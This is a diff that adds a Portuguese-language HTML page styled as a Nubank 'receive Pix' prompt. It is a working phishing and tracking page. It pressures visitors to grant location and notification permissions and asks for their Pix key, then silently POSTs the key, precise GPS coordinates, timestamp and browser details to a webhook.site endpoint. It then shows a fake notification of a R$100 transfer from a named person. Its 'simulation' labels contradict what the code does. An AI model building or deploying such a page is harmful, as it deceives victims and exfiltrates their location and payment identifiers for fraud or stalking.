@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>receber Pix</title>
+
+<style>
+body{
+  margin:0;
+  background:#f2f2f2;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial, sans-serif;
+}
+.card{
+  background:#fff;
+  padding:35px;
+  border-radius:18px;
+  width:320px;
+  text-align:center;
+}
+button{
+  background:#820ad1;
+  color:#fff;
+  border:none;
+  padding:15px;
+  width:100%;
+  font-size:18px;
+  border-radius:12px;
+  cursor:pointer;
+}
+input{
+  width:100%;
+  padding:12px;
+  font-size:16px;
+  margin:15px 0;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+small{ color:#777; font-size:12px; }
+.alert{
+  color:#b00020;
+  font-size:13px;
+  margin-top:10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card" id="tela1">
+  <button onclick="pedirPermissoes()">Receber Pix</button>
+  <div id="erro1" class="alert"></div>
+</div>
+
+<div class="card" id="tela2" style="display:none">
+  <input id="chave" placeholder="Digite sua chave Pix">
+  <button onclick="confirmar()">Receber Pix</button>
+  <small>Simulação — nenhum valor real será transferido</small>
+</div>
+
+<div class="card" id="tela3" style="display:none">
+  <h3>✅ Simulação concluída</h3>
+  <p>Você finalizou uma simulação.</p>
+</div>
+
+<script>
+const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
+let localOk = false;
+let notifOk = false;
+let lastPos = null;
+
+function pedirPermissoes(){
+  document.getElementById("erro1").innerText = "";
+
+  // localização
+  if(!navigator.geolocation){
+    document.getElementById("erro1").innerText =
+      "Seu navegador não suporta localização.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      localOk = true;
+      lastPos = pos;
+      pedirNotificacao();
+    },
+    () => {
+      document.getElementById("erro1").innerText =
+        "Por favor, dê as permissões para que possamos continuar a transferência.";
+    }
+  );
+}
+
+function pedirNotificacao(){
+  if(!("Notification" in window)){
+    notifOk = false;
+    checarPermissoes();
+    return;
+  }
+
+  Notification.requestPermission().then(p=>{
+    notifOk = (p === "granted");
+    checarPermissoes();
+  });
+}
+
+function checarPermissoes(){
+  if(localOk && notifOk){
+    document.getElementById("tela1").style.display="none";
+    document.getElementById("tela2").style.display="block";
+  }else{
+    document.getElementById("erro1").innerText =
+      "Por favor, dê as permissões para que possamos continuar a simulação.";
+  }
+}
+
+function confirmar(){
+  // envia pra tu
+  fetch(WEBHOOK,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chave_pix: document.getElementById("chave").value,
+      latitude: lastPos.coords.latitude,
+      longitude: lastPos.coords.longitude,
+      precisao: lastPos.coords.accuracy,
+      data: new Date().toISOString(),
+      navegador: navigator.userAgent
+    })
+  });
+
+  // notificação do site
+  if(notifOk){
+    new Notification("Transferência recebida",{
+      body:"você recebeu uma transferência de R$100.00 de carlos emanuel Pinheiro de Alcântara",
+      icon:"nubank-logo-2.png (4096×4108) https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png"
+    });
+  }
+
+  document.getElementById("tela2").style.display="none";
+  document.getElementById("tela3").style.display="block";
+}
+</script>
+
+</body>
+</html>
